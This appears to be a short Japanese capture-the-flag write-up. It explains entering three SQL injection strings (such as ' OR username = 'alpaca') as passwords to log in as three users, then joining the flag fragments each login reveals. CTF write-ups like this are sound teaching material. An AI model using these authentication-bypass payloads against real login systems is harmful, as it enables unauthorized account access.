以下を順番にパスワードとして入力する。

1. `' OR username = 'alpaca`
2. `' OR username = 'reindeer`
3. `' OR username = 'santa_claus_admin`

こうすると、ユーザ名が `alpaca`、`reindeer`、`santa_claus_admin` のいずれかであるだけでログインが成功する。

あとはそれぞれのログイン結果で得られたフラグの部品を組み合わせればフラグが完成する。